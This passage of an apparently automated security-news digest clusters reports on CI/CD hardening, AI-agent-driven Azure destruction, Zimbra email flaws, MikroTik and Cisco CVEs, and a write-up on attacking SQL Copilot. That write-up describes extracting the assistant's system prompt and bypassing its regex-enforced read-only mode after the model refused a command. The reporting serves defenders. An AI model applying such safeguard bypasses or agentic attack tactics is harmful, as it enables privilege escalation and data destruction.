exploiting unmonitored local access to collect personal access tokens (PATs), SSH keys, and proprietary code. Organizations should establish a unified security layer that enforces a consistent security posture across all local host machines and cloud-based development environments. Local Secret Scanning Organizations should deploy pre-commit hooks and IDE-integrated scanning tools to detect and block secrets prior to repository commit. Standardizing local pre-commit templates ensures git trees are fully verified before changes are pushed to central servers. To minimize the impact of a potential leak, organizations should migrate from legacy classic PATs to fine-grained PATs constrained by tight time-to-live (TTL) limits and minimal, environment-specific permissions. Endpoint Security Management Organizations should configure Endpoint Detection and Response (EDR) solutions to monitor developer software integrations and enforce continuous device posture checks. EDR agents should monitor trusted IDE process trees for anomalous file access, unexpected process spawning, and unauthorized outbound network connections. To ensure complete alignment, these EDR compliance signals should be integrated directly with Unified Endpoint Management (UEM) systems to automatically restrict or revoke a user's ability to access Source Code Management (SCM) systems, execute pipeline tasks, or publish code if their device falls out of compliance
```

#### Corroborating sources (7)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure
  - Published: 2026-09-24T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/hardening-code-pipelines-and-ci-cd-infrastructure/
  - Summary: Introduction The landscape of software supply chain security has undergone a significant shift. Recent campaigns demonstrate that sophisticated threat actors are systematically targeting the engineering lifecycle by compromising trusted security and programming tools. These intrusions reveal three key tactics: Attackers target trusted security scanners, utility libraries, and AI developer tools to exploit the elevated privileges granted to these systems within build pipelines. Adversaries target developer workstations and Integrated Development Environments (IDEs) via highly tailored social engineering, malicious extensions, or typosquatted local dependencies to exfiltrate private cryptographic keys, API tokens, and active session credentials directly from local engineering environments. Rather than relying solely on compromised static credentials, attackers have escalated to advanced pipeline manipulation techniques, including GitHub Actions cache poisoning, OpenID Connect ( OIDC) tok
- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: How we found 24 Android vulnerabilities using our open source AI security agent
  - Published: 2026-09-28T19:00:00+00:00
  - Link: https://github.blog/security/how-we-found-24-android-vulnerabilities-using-our-open-source-ai-security-agent/
  - Summary: A look at the targeted AI taskflows behind these findings, the critical Android bugs they uncovered, and how to run the same open-source agent on your own app. The post How we found 24 Android vulnerabilities using our open source AI security agent appeared first on The GitHub Blog .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: AI coding agents leaked 13,000 internal company screenshots to public GitHub repos
  - Published: 2026-09-30T11:52:30+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/30/ai-coding-agents-github-screenshot-leak/
  - Summary: When developers ask AI coding agents to prove that a user interface fix works, some agents have been posting the evidence where anyone can find it, according to Glow Labs. Diagram showing how AI agents leak screenshots to public repos (Source: Glow Labs) The researchers found more than 13,000 internal images published openly on GitHub by developers at over 300 organizations. The images, spread over more than 900 code repositories, include customer billing records and … More → The post AI coding agents leaked 13,000 internal company screenshots to public GitHub repos appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Compromised GitHub Actions Came Back Online and Resumed Executing Mini Shai-Hulud Malware
  - Published: 2026-09-25T14:44:41+00:00
  - Link: https://thehackernews.com/2026/09/compromised-github-actions-came-back.html
  - Summary: Two actions-cool GitHub Actions have been disabled for a second time after the repositories became accessible last week, months after they were compromised during the May 2026 Mini Shai-Hulud campaign. The affected GitHub Actions are listed below - actions-cool/issues-helper actions-cool/maintain-one-comment Visiting either of the repositories now shows the message: "Access to this
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: The Blue Agent POV: Investigating Multi-Platform Data Exfiltration Across AWS and GitHub
  - Published: 2026-09-29T12:42:40+00:00
  - Link: https://www.wiz.io/blog/blue-agent-data-exfiltration-investigation
  - Summary: See how the Blue Agent investigated a multi-platform attack in minutes, following evidence across AWS and GitHub to uncover compromised credentials, stolen source code, and custom data exfiltration tooling
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Argus Monitor Local Denial-of-Service Vulnerability (CVE-2026-79417)
  - Published: 2026-09-25T02:13:27+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wpkc7q/argus_monitor_local_denialofservice_vulnerability/
  - Summary: (1) An exposed IOCTL lets unprivileged users disable the x86 MONITOR & MWAIT instructions used by Hyper-V and other kernel components--triggering a HYPERVISOR_ERROR bugcheck. (2) Reaching the IOCTL requires exploiting a TOCTOU bug arguably caused by poor documentation of the SeLocateProcessImageName function. (3) Reimplementation of the driver's security through obscurity IOCTL encryption scheme: SHA-256 KDF-derived XOR keystream & CRC16 Checksum. See full write-up , and Github for PoC. submitted by /u/p0xq [link] [comments]
- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #347 - AI Agents Hacking Companies for $25, Threat Hunter's Guide to GitHub, Finding Gadgets Like it’s 2026
  - Published: 2026-09-24T14:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-347
  - Summary: Threat actor using open source harnesses to hack companies, how to use GitHub logs to find baddies, using LLMs to find novel Java deserialization gadgets

### Cluster b1ada69511 — score 20

- Title: Storm-3168: Agentic-driven cloud attacks using compromised service principals
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-25T15:35:08+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/25/storm-3168-agentic-driven-cloud-attacks-using-compromised-service-principals/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: Azure

#### Cluster taxonomy (union across members)
- threat_categories: cloud_abuse, ransomware_extortion
- affected_products: Azure, Microsoft Defender
- content_type: incident_report, news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_products: Azure, Microsoft Defender
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft details JADEPUFFER-linked Azure reconnaissance, resource deletion, and credential access using compromised service principals, identifying the activity as associated with Storm-3168 and providing guidance for defenders. The post Storm-3168: Agentic-driven cloud attacks using compromised service principals appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Topics Actionable threat insights AI and agents Threat intelligence Microsoft Security Research has identified malicious cloud activity associated with JADEPUFFER, a threat actor discovered by Sysdig in July 2026 and reported to be the first documented agentic ransomware operation. Our investigation found an extensive Azure-focused resource destruction activity using compromised service principals and cloud credential collection that could be used to facilitate future exfiltration. These findings expand the publicly documented activity associated with JADEPUFFER, tracked by Microsoft as Storm-3168, demonstrating an evolution in the threat actor’s cloud operations and providing the first detailed view into its Azure activity. We identified bulk destructive operations in a compromised Azure environment. The destructive operations were facilitated by compromising service principals and targeted Azure Storage Accounts, SQL databases, Key Vaults, Function Apps, recovery protection locks, Virtual Machines, and App Services. Organizations can reduce exposure by protecting workload identities and secrets, enforcing least privilege, safeguarding recovery resources, and enabling relevant Microsoft Defender for Cloud protections. Publicly exposed credentials remain usable until revoked or rotated; removing the original disclosure alone does not remediate the exposure. This activity highlights a broader shift toward AI-orchestrated attacks, where threat actors can coordinate complex post-compromise operations across cloud environments with greater speed and scale. As these capabilities evolve, defenders must similarly use AI to investigate and respond across large environments. Rather than requiring analysts to manually follow each individual action, efforts such as Project Perception and MDASH are intended to support a model in which defenders can investigate and respond across increasingly large and complex environments using AI. Attack overview Microsoft observed two compromised service principals belonging to the same tenant. One performed reconnaissance and resource discovery. The other performed discovery, destructive operations, and credential collection. Discovery before destruction For the impacted tenant, in early June 2026, one of the compromised service principals enumerated Azure Virtual Machines, subscriptions, resource groups and resources for about 15 hours and 30 minutes with 300+ successful read operations. This breadth of activity would give the threat actor visibility across the organization’s Azure environment. About 90 minutes after the first compromised service principal started enumeration, the second compromised service principal enumerated virtual machines and resource groups across two subscriptions in five seconds. Both service principals used Storm-3168 linked infrastructure, the same network fingerprint, and the user agent python-requests/2.34.2. 16 hours later, the second service principal successfully enumerated Azure App Service configuration stores, possibly looking for exposed credentials. It also unsuccessfully attempted to look for Azure OpenSearch resources. 70 seconds after this final inventory operation, the same service principal also attempted a ListKey operation against a non-existent storage account. A seven-minute destructive sequence Less than one second after the unsuccessful ListKey operation against a non-existent storage account, the second compromised service principal began with its destructive activities. This compromised service principal then attempted 150+ destructive or credential collection related operations in 35 minutes. The destructive sequence lasted for about 7 minutes. This involved 100+ storage account deletion attempts. Most Azure Storage accounts targeted by the threat actor were successfully deleted. However, Azure resource locks and storage account-level deletion protection b
```

#### Corroborating sources (4)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Storm-3168: Agentic-driven cloud attacks using compromised service principals
  - Published: 2026-09-25T15:35:08+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/25/storm-3168-agentic-driven-cloud-attacks-using-compromised-service-principals/
  - Summary: Microsoft details JADEPUFFER-linked Azure reconnaissance, resource deletion, and credential access using compromised service principals, identifying the activity as associated with Storm-3168 and providing guidance for defenders. The post Storm-3168: Agentic-driven cloud attacks using compromised service principals appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Storm-3168: Agentic-driven cloud attacks using compromised service principals
  - Published: 2026-09-25T15:35:08+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/25/storm-3168-agentic-driven-cloud-attacks-using-compromised-service-principals/
  - Summary: Microsoft details JADEPUFFER-linked Azure reconnaissance, resource deletion, and credential access using compromised service principals, identifying the activity as associated with Storm-3168 and providing guidance for defenders. The post Storm-3168: Agentic-driven cloud attacks using compromised service principals appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: JADEPUFFER-Linked Attackers Used Compromised Service Principals to Delete Azure Resources
  - Published: 2026-09-28T09:08:21+00:00
  - Link: https://thehackernews.com/2026/09/jadepuffer-linked-attackers-used.html
  - Summary: The threat actor known as JADEPUFFER has been observed orchestrating destructive actions within a Microsoft Azure environment using compromised service principals. Microsoft, which is tracking the activity under the name Storm-3168, has called it an evolution of the threat actor's tradecraft. The attack took place in early June 2026 over a period of about 18 hours. "The destructive operations
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: JadePuffer AI Actor Compromises Azure Tenant in Destructive Cloud Attack
  - Published: 2026-09-28T15:33:21+00:00
  - Link: https://www.darkreading.com/cloud-security/jadepuffer-ai-actor-azure-tenant-destructive-cloud-attack
  - Summary: The "agentic threat actor" may have used exposed credentials to access resources and delete cloud-based storage, applications, and databases.

### Cluster d1f6d41902 — score 16

- Title: When Business Email Compromise Starts Rewriting Reality
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-24T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ve-business-email-compromise-rewriting-reality-zimbra-cve
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, zero_day
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2022-27925, CVE-2022-37042, CVE-2024-45519, CVE-2025-27915, CVE-2026-73570
- urgency_signals: preauth_unauth, zero_day
- content_type: threat_research
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2024-45519, CVE-2025-27915, CVE-2026-73570, CVE-2022-27925, CVE-2022-37042
- urgency_signals: zero_day, preauth_unauth
- content_type: threat_research
- confidence_tier: tier_1_offensive_research

#### Summary

```
Business Email Compromise (BEC) operates on a familiar playbook. Threat actors breach a mailbox, silently monitor operations, map approval chains, and ultimately exploit that access to divert funds or exfiltrate sensitive assets. This dynamic is central to our analysis as we kick off a series around Rapid7's collaborative research with Zimbra; upcoming installments will explore technical details and broader findings based within the Zimbra Collaboration Suite. Our investigation disrupted the traditional BEC model in unexpected ways. We uncovered over 50 vulnerabilities, and found that several allow attackers not just to observe environments, but to actively rewrite them by impersonating senders without credentials, controlling inbox visibility, and altering shared documents and calendars. Business Email Compromise in action: Digital abuse of trust None of this is theoretical for Zimbra. But don’t take my word for it, just ask Russia . CISA keeps putting Zimbra bugs into the Known Explo
```

#### Full body

```
Phishing When Business Email Compromise Starts Rewriting Reality Douglas McKee, Director, Vulnerability Intelligence Sep 24, 2026 | Last updated on Sep 24, 2026 | 6 min read DISCOVER RAPID7 MDR When Business Email Compromise Starts Rewriting Reality Table of contents When Business Email Compromise Starts Rewriting Reality DISCOVER RAPID7 MDR Table of contents Business Email Compromise (BEC) operates on a familiar playbook. Threat actors breach a mailbox, silently monitor operations, map approval chains, and ultimately exploit that access to divert funds or exfiltrate sensitive assets. This dynamic is central to our analysis as we kick off a series around Rapid7's collaborative research with Zimbra; upcoming installments will explore technical details and broader findings based within the Zimbra Collaboration Suite. Our investigation disrupted the traditional BEC model in unexpected ways. We uncovered over 50 vulnerabilities, and found that several allow attackers not just to observe environments, but to actively rewrite them by impersonating senders without credentials, controlling inbox visibility, and altering shared documents and calendars. Business Email Compromise in action: Digital abuse of trust None of this is theoretical for Zimbra. But don’t take my word for it, just ask Russia . CISA keeps putting Zimbra bugs into the Known Exploited Vulnerabilities catalog , and the last three years make the point on their own: CVE-2024-45519 , command injection in the postjournal service, unauthenticated command execution. Proofpoint saw attackers stuffing base64 payloads into CC fields on September 28, 2024. CISA added it to KEV on October 3. CVE-2025-27915 , stored XSS in the Classic Web Client, triggered by a crafted .ICS attachment. It is used as a zero-day against Brazilian military targets to steal mail and quietly set forwarding filters. It went into KEV in October, 2025. CVE-2026-73570 , unauthenticated command injection through SNMP notification handling. CISA added it on August 21 of this year and gave federal agencies three days. Shadowserver has been counting somewhere north of 260 compromised instances while hunting for exploitation artifacts. Go back further and the pattern holds. Rapid7 tracked widespread exploitation of CVE-2022-27925 and CVE-2022-37042 in 2022, a path traversal chained with an authentication bypass that let attackers drop a JSP shell on a Zimbra server without credentials. Google's Threat Analysis Group later documented four separate threat groups working the same zero-day known as CVE-2023-37580. Each of these groups went after email, credentials, and authentication tokens. Attackers figured out a long time ago that the system sitting in the middle of everyone's communication is worth the effort. So when you find a set of bugs that let you write to that system instead of only reading from it, data theft stops being the interesting part. Send an email as your CFO without ever touching their password, and you have the front half of a very convincing BEC. Keep control of the mailbox afterward and you have the back half, too. Here, the attacker has a strategic choice. They can delete the sent message to hide their tracks, effectively wiping the trail of the fraud OR they can choose to leave the message in the Sent Items folder. By doing so, they ensure the CFO sees 'evidence' of the email they supposedly sent, creating a gaslighting scenario where the victim is left questioning their own actions. Whether the attacker cleans up or leaves the trail, they are shaping the organization’s perception of reality. In the ensuing investigation, where Finance sees a sent request and the CFO sees no such activity, the organization is trapped in a conflict of evidence. At that point, BEC looks less like traditional fraud and more like a psychological operation. Documents make it worse, as Zimbra is not just a mail server. The collaboration side holds the files employees actually use to make decisions. An attacker
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: When Business Email Compromise Starts Rewriting Reality
  - Published: 2026-09-24T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ve-business-email-compromise-rewriting-reality-zimbra-cve
  - Summary: Business Email Compromise (BEC) operates on a familiar playbook. Threat actors breach a mailbox, silently monitor operations, map approval chains, and ultimately exploit that access to divert funds or exfiltrate sensitive assets. This dynamic is central to our analysis as we kick off a series around Rapid7's collaborative research with Zimbra; upcoming installments will explore technical details and broader findings based within the Zimbra Collaboration Suite. Our investigation disrupted the traditional BEC model in unexpected ways. We uncovered over 50 vulnerabilities, and found that several allow attackers not just to observe environments, but to actively rewrite them by impersonating senders without credentials, controlling inbox visibility, and altering shared documents and calendars. Business Email Compromise in action: Digital abuse of trust None of this is theoretical for Zimbra. But don’t take my word for it, just ask Russia . CISA keeps putting Zimbra bugs into the Known Explo

### Cluster 4e9e2ada1e — score 16

- Title: CISA warns of critical pre-auth RCE flaw in MikroTik RouterOS
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-30T15:49:29+00:00
- Link: https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-pre-auth-rce-flaw-in-mikrotik-routeros/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, ransomware_extortion
- affected_products: Linux kernel, Microsoft SharePoint, SonicWall
- cve_ids: CVE-2026-67276, CVE-2026-84411, CVE-2026-86060
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, ddos, active_exploitation
- affected_products: Linux kernel, Microsoft SharePoint, SonicWall
- cve_ids: CVE-2026-84411, CVE-2026-67276, CVE-2026-86060
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is warning of a new critical vulnerability in MikroTik RouterOS that could lead to remote code execution or cause a denial-of-service condition. [...]
```

#### Full body

```
CISA warns of critical pre-auth RCE flaw in MikroTik RouterOS By Bill Toulas September 30, 2026 11:49 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is warning of a new critical vulnerability in MikroTik RouterOS that could lead to remote code execution or cause a denial-of-service condition. Tracked as CVE-2026-84411, the security issue is a pre-authentication integer underflow in RouterOS’s web-management HTTP request handling. CISA says that a single crafted request can produce code execution with root privileges or denial of service. “The web management service in affected RouterOS versions contains an integer underflow in its HTTP request body handling that is reachable before authentication,” reads the alert . “This can be leveraged by an unauthenticated network attacker to achieve arbitrary code execution as root, or to cause a denial of service, using a single crafted request.” Although the agency has no knowledge of the vulnerability being actively exploited, it released the advisory to alert organizations of the risk and to provide defensive measures. CISA notes that MikroTik RouterOS versions below 7.24 are currently affected. However, the agency also says that the vendor recommends that users update to version 7.23 or later to mitigate the risk. It should be noted that the latest stable version of MikroTik RouterOS is 7.24.4, while the most recent long-term release is 7.23.7, both available since September 16. BleepingComputer has emailed both MikroTik and CISA for clarification about the RouterOS versions affected by CVE-2026-84411, but we have not received a response as of publication. The vendor has yet to publish a security advisory about the issue. CISA's recommendations to MikroTik router owners include the following defensive actions: Keep control systems inaccessible from the internet. Place control networks and remote devices behind firewalls, isolated from business networks. Use updated VPNs for remote access and secure all connected devices. Although no active exploitation of CVE-2026-84411 has been publicly disclosed, hackers and botnet malware often target MikroTik flaws. Recently, Poland’s CERT agency warned that attackers used an exploit chain of two MikroTik RouterOS vulnerabilities, CVE-2026-67276 and CVE-2026-86060 , to take full control of devices with SSH services exposed to the internet. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Hackers exploit new MikroTik RouterOS flaws to hijack routers CISA warns of Sharepoint, WSO2, Adobe Commerce flaws exploited in attacks CISA alerts of active exploitation of three Linux kernel flaws CISA orders urgent patching of actively exploited Zimbra flaw CISA: SonicWall SMA1000 flaws now exploited by ransomware gangs
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: CISA warns of critical pre-auth RCE flaw in MikroTik RouterOS
  - Published: 2026-09-30T15:49:29+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-pre-auth-rce-flaw-in-mikrotik-routeros/
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is warning of a new critical vulnerability in MikroTik RouterOS that could lead to remote code execution or cause a denial-of-service condition. [...]

### Cluster 38ffcad665 — score 16

- Title: Cisco Patches Exploited Catalyst SD-WAN Zero-Day Vulnerability
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-01T08:26:03+00:00
- Link: https://www.securityweek.com/cisco-patches-exploited-catalyst-sd-wan-zero-day-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Anthropic/Claude, Cisco, OpenAI/ChatGPT
- cve_ids: CVE-2026-76504
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Cisco, OpenAI/ChatGPT, Anthropic/Claude
- cve_ids: CVE-2026-76504
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The flaw could allow remote, unauthenticated attackers to access vulnerable appliances with administrative privileges. The post Cisco Patches Exploited Catalyst SD-WAN Zero-Day Vulnerability appeared first on SecurityWeek .
```

#### Full body

```
Cisco on Wednesday rolled out urgent patches for a critical authentication bypass in Catalyst SD-WAN Manager that has been exploited in the wild. Tracked as CVE-2026-76504 (CVSS score of 9.8), the flaw impacts the API session-based authentication mechanism and could allow remote, unauthenticated attackers to gain administrative access to a vulnerable system. “In September 2026, the Cisco PSIRT became aware of active exploitation of this vulnerability. Cisco strongly recommends that customers upgrade to a fixed software release to remediate this vulnerability,” the company warned . According to Cisco, the issue resides in the improper handling of URI encoding in an HTTP request, allowing attacker requests to reach a restricted API endpoint. “An attacker could exploit this vulnerability by sending a crafted HTTP request to the API of the affected system. A successful exploit could allow the attacker to bypass authentication and gain access to the API as the admin user,” Cisco explains. All Catalyst SD-WAN Manager deployments are affected, regardless of their configuration, and there are no workarounds. Advertisement. Scroll to continue reading. CVE-2026-76504 was resolved in Catalyst SD-WAN versions 26.2.1, 26.1.2.1, 20.18.4.1, 20.15.6.1, 20.12.8.2, and 20.9.10.1. Cisco-managed SD-WAN deployments have been patched as well. Cisco has released indicators of compromise (IoCs) to help security teams hunt for potential exploitation attempts, and published general recommendations for hardening at-risk systems. On Wednesday, the US cybersecurity agency CISA added the security defect to its Known Exploited Vulnerabilities (KEV) catalog, urging federal agencies to patch it within three days. Neither Cisco nor CISA has shared details on the security bug’s in-the-wild exploitation. “ Cisco SD-WAN feels like an ever-present staple of the CISA Known Exploited Vulnerabilities list, with eight 2026 CVEs landing on KEV this year alone – this should be an extremely clear signal that attackers have recognized the value of the platform, and this pattern is unlikely to slow down,” WatchTowr head of threat intelligence Jake Knott said. “None of this should surprise anyone. As a single-pane-of-glass used by enterprises to manage, configure, and monitor large networks, it is naturally an attractive target. Organizations running Catalyst SD-WAN Manager should upgrade to a fixed release immediately and follow vendor guidance, including hunting for POST requests to any URL-encoded variants of ‘/j_security_check’ and reviewing instances for signs exploitation has already occurred,” Knott added. Related: Google: AI Is Changing the Pace and Profile of Vulnerability Discovery Related: WatchGuard Patches Critical Fireware OS Code Injection Vulnerability Related: Government, Finance Orgs Targeted in Weeks-Long NetScaler Zero-Day Attacks Related: Chrome, Firefox Updates Patch Over 100 Vulnerabilities Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire ShinyHunters Defiant After FBI Calls on Members to Come Forward Reco Raises $55 Million for Agentic Security Hackers Use ChatGPT Custom GPTs in ClickFix Attacks Dutch Police Arrest Convicted Hacker in ShinyHunters Investigation Daemon Tools Hackers’ NeedyMantis Malware Dissected by Microsoft Prison Sentence for Former US Soldier Who Hacked AT&T and Verizon DC Health Agency Exposes 400,000 Beneficiary Records Google Warns of ShinyHunters’ Fresh Oracle PeopleSoft Campaign Latest News Google Launches Gemini 4 Argon With Guardrail-Free Access for Vetted Defenders FTC is Investigating OpenAI and Anthropic Over Possible Risks to Consumers Google: AI Is Changing the Pace and Profile of Vulnerability Discovery WatchGuard Patches Critical Fireware OS Code Injection Vulnerability Government, Finance Orgs Targeted in Weeks-Long
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Cisco Patches Exploited Catalyst SD-WAN Zero-Day Vulnerability
  - Published: 2026-10-01T08:26:03+00:00
  - Link: https://www.securityweek.com/cisco-patches-exploited-catalyst-sd-wan-zero-day-vulnerability/
  - Summary: The flaw could allow remote, unauthenticated attackers to access vulnerable appliances with administrative privileges. The post Cisco Patches Exploited Catalyst SD-WAN Zero-Day Vulnerability appeared first on SecurityWeek .

### Cluster 2b530e9966 — score 16

- Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
- Source: Embrace the Red (ai_security_agentic_risk)
- Published: 2026-09-30T21:00:40+00:00
- Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-65669

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.
```

#### Full body

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus. This time was quite different. The event was in Singapore. It took a while to get there, but the event and side quests were amazing. Speakers got to enjoy a “Behind the Scenes” tour of the Gardens by the Bay . It was great to connect with fellow researchers and attendees throughout the event. Besides excellent talks from Halvar Flake, Stefan Esser, Chumy, and many others, there were also plenty of capture the flag challenges, which I enjoyed playing. Anyhow, let’s talk about exploiting Copilot in SQL Server Management Studio. Reconnaissance: From SELECT to SYSADMIN Microsoft integrated Copilot into its database system via the SQL Server Management Studio. Naturally, one of my first prompts was: list all your tools However, SQL Copilot did not expose much… just 5 tools… 🤔 That had me confused. And after opening an authenticated Query Window to a database, a much larger set of database-specific tools became available. Here is a subset of the full tool list: There are tools for schema exploration, retrieving query results, inspecting database objects, reading database content, validating T/SQL, backup operations, and more. The important realization was that Copilot executes with the privileges of the connected user. Detour: SQL Copilot System Prompt The system prompt can easily be retrieved via the chatlogs in %APPDATA%\Local\SSMSCopilot\* . You are a AI copilot assistant running inside of SQL Server Management Studio and connected to a specific SQL Server database . Act as a SQL Server and SQL Server Management Studio SME. Here is a copy of the system prompt when I did the research. Anyhow, back to the tools. The ReadFromDatabase Tool SQL Copilot uses the connection from the Query Window. This means that if the user is connected as sysadmin , then Copilot also executes SQL using that sysadmin connection. One of the tools that caught my attention right away was the ReadFromDatabase tool. It allows Copilot to read data from databases. That immediately makes one question rather important: What prevents Copilot from running arbitrary or dangerous T/SQL? The answer is “Read-Only” mode. Here is the relevant part of the system prompt: # YOUR QUERY EXECUTION MODE : You are running in a read - only mode . The Copilot system prompt explicitly tells the model that it is operating in a read-only mode. It is instructed to not execute queries that change database or server state. At first glance, the model did refuse obvious requests to modify data or those that have side-effects. For example, when asked to invoke xp_dirtree , which connects to a remote server, Copilot explained that running server-level or OS-accessing stored procedures was not allowed. But system prompt instructions are not a security boundary. So, I was wondering if the read-only mode was actually enforced somewhere. Breaking Read-Only Mode via the ReadFromDatabase Tool After reversing the relevant code for ReadFromDatabase with my AI research crew and ILSpy , it turned out that the read-only enforcement is a regex-based classifier in the LocalSqlExecutionAccessChecker class. For instance, the regex for blocking EXEC looked like this. Blocklists are fragile security controls. There are often many ways a given capability can be bypassed. Besides that regex, there was no separate low-privileged database connection or read-only permission enforcement. That seemed worth poking at, and with the help of AI bypasse
```

#### Corroborating sources (1)

- **Embrace the Red** (ai_security_agentic_risk)
  - Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
  - Published: 2026-09-30T21:00:40+00:00
  - Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
  - Summary: Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.

### Cluster e823177ebb — score 15

- Title: Defending at machine speed: Securing the public sector in the agentic era
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-09-29T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/public-sector/defending-at-machine-speed-securing-the-public-sector-in-the-agentic-era/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 4
- Strong signals: Google/Gemini

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: critical_infrastructure, education, financial_services, government
- affected_products: Android, Google/Gemini
- urgency_signals: zero_day
- content_type: news_report, vendor_announcement
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: government, critical_infrastructure, education
- affected_products: Google/Gemini
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
